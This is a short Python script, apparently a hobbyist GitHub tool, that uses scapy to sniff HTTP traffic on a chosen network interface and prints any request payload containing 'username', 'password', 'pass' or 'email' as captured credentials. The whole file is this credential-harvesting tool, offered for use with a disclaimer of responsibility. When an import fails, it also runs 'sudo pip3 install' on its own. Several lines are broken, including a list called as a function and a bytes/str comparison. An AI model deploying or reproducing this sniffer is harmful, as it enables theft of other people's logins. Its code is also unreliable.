"""
Author: @new92
Sniffer: Program for Sniffing Packets in the Network
The Author has no responsibility for the use of this program
"""

#Imports

try:
    import time
    import platform
    from os import system
    import sniffer
    import nmap
    import os
    import sys
    import scapy.all as scapy
    import argparse
    import art
    from art import tprint
    from scapy.layers import http
except ImportError as imp:
    print("[!] WARNING: Not all modules used in this program have been installed !")
    time.sleep(2)
    print("[+] Ignoring Warning...")
    time.sleep(1)
    if platform.system == "Windows":
        system("pip3 install -r requirements.txt")
    else:
        system("sudo pip3 install -r requirements.txt")

#Logo

tprint("SNIFFER",font="tarty1")

#Defs

def Intface():
    time.sleep(2)
    intface = input("[+] Please enter the interface: ")
    while intface == None:
        print("[!] You must enter an Interface in order for the program to work !")
        time.sleep(2)
        intface = input("[+] Please enter again the interface: ")
    return intface

def Spoof(iface):
    scapy.sniff(iface=iface, store=False, prn=SniffPack)

def SniffPack(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] HTTP Request --> "+str(packet[http.HTTPRequest].Host) + str(packet[http.HTTPRequest].Path))
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keys = ["username","password","pass","email"]
            for key in keys():
                if key in load:
                    print("[!] Captured Possible Password/Username/Email --> "+str(load))
#Main Program

print("\n")
print("[+] Program for Sniffing and Capturing Packets in the network !")
print("\n")
print("[+] Github: @new92")
print("\n")
print("[1] Initiate Sniffer")
print("[2] Exit")
option = int(input("[::] Please enter the choice: "))
while option <= 0 or option > 2 or option == None:
    print("[!] Invalid Choice !")
    time.sleep(1)
    option=int(input("[::] Please enter again the choice: "))

iface = Intface()
time.sleep(1)
print("[+] Sniffer Started...")
time.sleep(2)
print("[+] Please wait while the program is gathering packets...")
Spoof(iface)
